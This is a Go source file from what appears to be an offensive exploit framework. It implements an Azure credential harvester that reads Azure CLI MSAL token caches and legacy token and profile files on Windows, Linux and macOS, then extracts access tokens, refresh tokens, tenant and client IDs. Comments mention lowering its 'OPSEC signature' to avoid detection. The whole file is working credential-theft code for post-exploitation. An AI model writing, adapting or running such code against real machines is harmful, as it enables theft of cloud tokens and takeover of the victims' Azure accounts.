package cloud

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
)

// harvestAzureCLI reads Azure CLI token cache files.
// Cross-platform: works on Windows, Linux, and macOS.
func harvestAzureCLI(_ context.Context) *pb.CloudHarvestResult {
	result := &pb.CloudHarvestResult{
		Provider: "azure",
		Method:   "cli",
	}

	paths := azureCLIPaths()
	found := false

	// M1: Check file existence before reading to reduce OPSEC signature
	for _, path := range paths {
		if _, err := os.Stat(path); err != nil {
			continue
		}
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		tokens := parseAzureMSALCache(data, path)
		result.Tokens = append(result.Tokens, tokens...)
		found = true
	}

	// Also check for legacy azure profile
	for _, path := range azureProfilePaths() {
		if _, err := os.Stat(path); err != nil {
			continue
		}
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		tokens := parseAzureProfile(data, path)
		result.Tokens = append(result.Tokens, tokens...)
		found = true
	}

	if !found {
		return nil
	}
	return result
}

func azureCLIPaths() []string {
	var paths []string
	home, _ := os.UserHomeDir()

	// MSAL token cache (modern Azure CLI)
	paths = append(paths, filepath.Join(home, ".azure", "msal_token_cache.json"))

	if runtime.GOOS == "windows" {
		localAppData := os.Getenv("LOCALAPPDATA")
		if localAppData != "" {
			paths = append(paths, filepath.Join(localAppData, ".IdentityService", "msal.cache"))
		}
	}

	// Azure CLI access tokens (legacy)
	paths = append(paths, filepath.Join(home, ".azure", "accessTokens.json"))

	return paths
}

func azureProfilePaths() []string {
	home, _ := os.UserHomeDir()
	return []string{
		filepath.Join(home, ".azure", "azureProfile.json"),
	}
}

// msalCacheEntry represents an entry in the MSAL token cache
type msalCacheEntry struct {
	HomeAccountID string `json:"home_account_id"`
	Environment   string `json:"environment"`
	ClientID      string `json:"client_id"`
	Secret        string `json:"secret"`
	CredentialType string `json:"credential_type"`
	Realm         string `json:"realm"`
	Target        string `json:"target"`
	ExpiresOn     string `json:"expires_on"`
}

func parseAzureMSALCache(data []byte, source string) []*pb.CloudToken {
	var tokens []*pb.CloudToken

	var cache map[string]json.RawMessage
	if err := json.Unmarshal(data, &cache); err != nil {
		return nil
	}

	// Parse AccessToken entries
	if atRaw, ok := cache["AccessToken"]; ok {
		var accessTokens map[string]msalCacheEntry
		if err := json.Unmarshal(atRaw, &accessTokens); err == nil {
			for _, entry := range accessTokens {
				if entry.Secret == "" {
					continue
				}
				// L1: Use basename instead of full path to avoid leaking local paths
				tokens = append(tokens, &pb.CloudToken{
					Provider:    "azure",
					TokenType:   "access_token",
					AccessToken: entry.Secret,
					TenantId:    entry.Realm,
					ClientId:    entry.ClientID,
					Resource:    entry.Target,
					Source:      filepath.Base(source),
				})
			}
		}
	}

	// Parse RefreshToken entries
	if rtRaw, ok := cache["RefreshToken"]; ok {
		var refreshTokens map[string]msalCacheEntry
		if err := json.Unmarshal(rtRaw, &refreshTokens); err == nil {
			for _, entry := range refreshTokens {
				if entry.Secret == "" {
					continue
				}
				tokens = append(tokens, &pb.CloudToken{
					Provider:     "azure",
					TokenType:    "refresh_token",
					RefreshToken: entry.Secret,
					ClientId:     entry.ClientID,
					Source:       filepath.Base(source),
				})
			}
		}
	}

	return tokens
}

func parseAzureProfile(data []byte, source string) []*pb.CloudToken {
	var tokens []*pb.CloudToken

	// Legacy accessTokens.json format
	var entries []struct {
		TokenType    string `json:"tokenType"`
		AccessToken  string `json:"accessToken"`
		RefreshToken string `json:"refreshToken"`
		ExpiresOn    string `json:"expiresOn"`
		Resource     string `json:"resource"`
		Authority    string `json:"authority"`
		UserID       string `json:"userId"`
	}
	if err := json.Unmarshal(data, &entries); err != nil {
		return nil
	}

	// L1: Use basename to avoid leaking full local paths
	baseName := filepath.Base(source)
	for _, entry := range entries {
		if entry.AccessToken != "" {
			tokens = append(tokens, &pb.CloudToken{
				Provider:    "azure",
				TokenType:   "access_token",
				AccessToken: entry.AccessToken,
				Resource:    entry.Resource,
				Source:      baseName,
			})
		}
		if entry.RefreshToken != "" {
			tokens = append(tokens, &pb.CloudToken{
				Provider:     "azure",
				TokenType:    "refresh_token",
				RefreshToken: entry.RefreshToken,
				Source:       baseName,
			})
		}
	}

	return tokens
}
